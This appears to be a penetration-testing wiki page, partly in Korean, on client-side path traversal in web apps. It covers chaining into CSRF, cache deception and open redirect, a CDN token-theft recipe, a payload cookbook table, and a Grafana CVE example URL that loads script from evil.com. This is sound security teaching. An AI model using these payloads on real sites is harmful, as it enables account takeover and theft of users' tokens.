# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

A client side path traversal occurs when you can **manipulate the path of a URL** that is going to be **sent to a user to visit in a legit way** or that a user is somehow going to be **forced to visit for example via JS or CSS**. CSPT is also known as **On-Site Request Forgery (OSRF)** because it lets you coerce the victim’s browser into hitting arbitrary paths on the same origin with their cookies, JWTs, or mTLS certificates.

Typical sources (data you control):

- 경로 매개변수(route parameters)가 `fetch()` 또는 XHR 경로에 연결되는 경우 (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- background jobs, service workers, 또는 WebSocket URL 내부 경로에 보간(interpolated)되는 저장된 값(profile slugs, document IDs).
- 요청이 전송되기 전에 사용자 제어 가능한 프래그먼트나 파일 확장자를 API 엔드포인트에 덧붙이는 UI 요소(download/export buttons, image galleries).

Typical sinks (where the traversal lands):

- 프론트엔드 API 래퍼가 `/api/` 또는 `/proxy/`를 앞에 붙이고 auth headers를 자동으로 재사용하는 경우.
- `history.pushState` / `router.navigate` 헬퍼가 hydration 중에 나중에 URL을 재구성하는 경우.
- `<link>`/`<style>`/`@import` 문이 CMS 콘텐츠나 feature-flag payloads에 의해 생성되는 경우.

### 일반적인 영향 및 연쇄

- **CSPT ➜ CSRF/OSRF**: 의도한 리소스 경로를 벗어나 인증된 `POST/PUT/DELETE` 호출을 탈취한 뒤 민감한 엔드포인트(비밀번호 재설정, 결제 승인, 접근 권한 회수 등)로 재진입할 수 있습니다. 권한 상승을 위해 [CSRF](csrf-cross-site-request-forgery.md) 체크리스트와 결합하세요.
- **CSPT ➜ cache deception / poisoning**: 공용 CDN 키로 공격자가 제어하는 JSON을 제공하고 인증 없이 재생할 수 있습니다. 자세한 내용은 [Cache Poisoning and Cache Deception](cache-deception/README.md)을 참조하세요.
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: 탐색이 open redirect 엔드포인트에 도달하면 공격자 인프라로 재전송되어 악성 JS나 SSRF 페이로드를 제공할 수 있습니다. [Open Redirect](open-redirect.md) 악용과 연결해 체인을 만들 수 있습니다.

### 발견 사례

- 이 [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/)에서는 **초대 URL을 변경**해 결국 **카드를 취소**하도록 만들 수 있었습니다.
- 이 [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html)에서는 **client side path traversal via CSS**(CSS 리소스가 로드되는 경로를 변경할 수 있음)를 **open redirect**와 결합해 CSS 리소스를 **attacker controlled domain**에서 불러올 수 있었습니다.
- 이 [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)에서는 CSPT를 **CSRF 공격 수행**에 악용하는 방법을 보여줍니다. 이는 공격자가 제어하는 모든 데이터(URL 경로, 파라미터, 프래그먼트, DB에 주입된 데이터 등)와 해당 데이터가 도달하는 싱크(요청)를 모니터링하는 방식으로 이루어집니다.
- 모니터링을 위해 [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/)를 확인하세요.
- 기술을 시험해보려면 [**CSPT playground**](https://github.com/doyensec/CSPTPlayground)를 확인하세요.
- 플레이그라운드에서 브라우저 확장 기능을 사용하는 방법은 [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html)를 확인하세요.

## CSPT-assisted web cache poisoning/deception

CSPT can be chained with extension-based CDN caching to exfiltrate sensitive JSON leaked by authenticated API calls:

- A frontend concatenates user-controlled input into an API path and attaches authentication headers in fetch/XHR.
- By injecting dot-segments (../) you can retarget the authenticated request to a different endpoint on the same origin.
- If that endpoint (or a path variant with a static-looking suffix like .css) is cached by the CDN without varying on auth headers, the victim’s authenticated response can be stored under a public cache key and retrieved by anyone.

Quick recipe:

1) Find SPA code building API URLs from path parameters while sending auth headers.
2) Identify sensitive endpoints and test static suffixes (.css, .js, .jpg, .json) to see if the CDN flips to Cache-Control: public/max-age and X-Cache: Hit while returning JSON.
3) Lure the victim to a URL that injects traversal into the SPA parameter so the authenticated fetch hits the cacheable path variant (for example, ../../../v1/token.css).
4) Read back the same URL anonymously to obtain the cached secret (token → ATO).

See details and mitigations in the Cache Deception page: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## 헌팅 워크플로우 및 도구

### Passive discovery with intercepting proxies

- **Correlate sources/sinks automatically**: the [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parses your proxy history, clusters parameters that are later reflected inside other requests’ paths, and can reissue proof-of-concept URLs with canary tokens to confirm exploitable traversals. After loading the JAR, set the `Source Scope` to client parameters (e.g., `id`, `slug`) and the `Sink Methods` to `GET, POST, DELETE` so the extension highlights dangerous request builders. You can export all suspect sources with an embedded canary to validate them in bulk.
- **Look for double-URL-decoding**: while browsing with Burp or ZAP, watch for `/api/%252e%252e/` patterns that get normalized by the frontend before hitting the network—these usually show up as base64-encoded JSON bodies referencing route state and are easy to overlook without an automated scanner.

### Instrumenting SPA sinks manually

DevTools에 짧은 스니펫을 넣으면 UI와 상호작용하는 동안 숨겨진 탐색을 드러내는 데 도움이 됩니다:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Add similar wrappers around `XMLHttpRequest.prototype.open`, `history.pushState`, and framework-specific routers (e.g., `next/router`). Watching for `init.credentials === "include"` quickly narrows down requests that carry session cookies.
- If the app stores routing hints in IndexedDB/localStorage, edit those entries with traversal payloads and reload—the mutated state is often reinjected into requests pre-hydration.

### 실습 및 페이로드 리허설

- CSPT Playground를 `docker compose up`로 띄우고 대상에 손대지 않고도 traversal ➜ CSRF ➜ stored XSS 흐름을 연결해 연습하세요. 대상의 router 구조를 로컬에서 재현하면 공유 가능한 PoC를 만들기 쉬워집니다.
- 리컨 중에 관찰한 성공적인 dot-segment 변형들(`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs)과 접미사 트릭들(`.css`, `.json`, `;` matrix params)의 스크래치패드를 유지해 새로운 sink가 나타났을 때 빠르게 재생할 수 있게 하세요.

## 최근 사례 연구 (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – `/public/plugins/` 내부의 traversal gadget이 공격자로 하여금 `../../`를 plugin asset loader로 밀어넣게 허용했고, 이를 Grafana의 open redirect와 연결해 피해자가 공격자가 제어하는 plugin 번들을 로드하도록 강제했습니다. anonymous dashboards가 활성화된 경우, `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` 같은 조작된 URL로 인해 브라우저가 원격 JavaScript를 실행했고; Image Renderer plugin이 설치되어 있으면 동일한 기법을 렌더링 요청을 내부 호스트로 리다이렉트해 SSRF로 전환할 수도 있었습니다. 단일 traversal이 종종 XSS와 SSRF 양쪽 벡터를 모두 제공하므로 plugin asset 경로, anonymous dashboards, renderer endpoints를 함께 테스트하세요.

## Payload cookbook

| 목표 | 페이로드 패턴 | 비고 |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Works when routers simply concatenate `/${doc}`. Add `.json` if CDN only caches static-looking assets. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | 대상 코드베이스에 나열된 신뢰되는 redirectors와 결합하세요. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN may treat `.css` as static and cache secrets returned as JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Some routers accept `_method` overrides; pair with traversal to re-target destructive endpoints. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
